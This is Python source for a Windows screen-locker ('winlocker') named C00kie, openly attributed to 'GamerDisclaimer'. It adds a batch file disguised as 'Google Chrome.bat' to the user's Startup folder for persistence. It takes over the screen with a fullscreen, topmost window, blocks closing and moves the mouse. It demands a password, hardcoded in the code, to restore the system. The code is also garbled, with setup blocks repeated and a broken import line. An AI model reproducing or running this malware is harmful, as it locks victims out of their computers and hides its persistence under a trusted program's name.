from playsound import *
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep
USER_NAME = getpass.getuser()
window = Tk() # anti  Tk()
window.title("C00kie") 
window.geometry('400x250')
window['bg'] = 'black' 

window.mainloop() 
rom playsound import *
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep
USER_NAME = getpass.getuser()

window = Tk()
window.title("C00kie")  
window.geometry('400x250')
window['bg'] = 'black'

window.mainloop()
# Base size
normal_width = 1920 
normal_height = 1080 

# Get screen size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

# Get percentage of screen size from Base size
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

# Make a scaling factor, this is bases on average percentage from
# width and height.
scale_factor = ((percentage_width + percentage_height) / 2) / 100

# Set the fontsize based on scale_factor,
# if the fontsize is less than minimum_size
# it is set to the minimum size

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size

# Create a style and configure for ttk.Button widget
default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))
from playsound import *
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep
USER_NAME = getpass.getuser()

window = Tk()
window.title("WinLocker by GDisclaimer")  
window.geometry('400x250')
window['bg'] = 'black'

# Base size
normal_width = 1920
normal_height = 1080

# Get screen size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

# Get percentage of screen size from Base size
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

# Make a scaling factor, this is bases on average percentage from
# width and height.
scale_factor = ((percentage_width + percentage_height) / 2) / 100

# Set the fontsize based on scale_factor,
# if the fontsize is less than minimum_size
# it is set to the minimum size

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size

# Create a style and configure for ttk.Button widget
default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))

window.mainloop()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

def block():
    pyautogui.moveTo(x=680,y=800)
    window.protocol("WM_DELETE_WINDOW",block)
    window.update()

def fullscreen():
    window.attributes('-fullscreen', True, '-topmost', True)

def clicked():
    res = format(txt.get())
    if res == '02840294':
        file_path = '/tmp/file.txt'
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()
add_to_startup("C:\\myFiles\\main.py") 
fullscreen() 


txt_one = Label(window, text='WinLocker by GamerDisclaimer', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='Сорри, бро :(', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Your computer infected by winlocker C00kie!Enter password to get your system back!', font=("Arial Bold", fontsize), fg='white', bg='black')


txt_one.grid(column=0, row=0)
txt_two.grid(column=0, row=0)
txt_three.grid(column=0, row=0)


txt_one.place(relx = .01, rely = .01)
txt_two.place(relx = .01, rely = .11)
txt_three.place(relx = .01, rely = .21)


txt = Entry(window)  
btn = Button(window, text="enter password", command=clicked)  
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
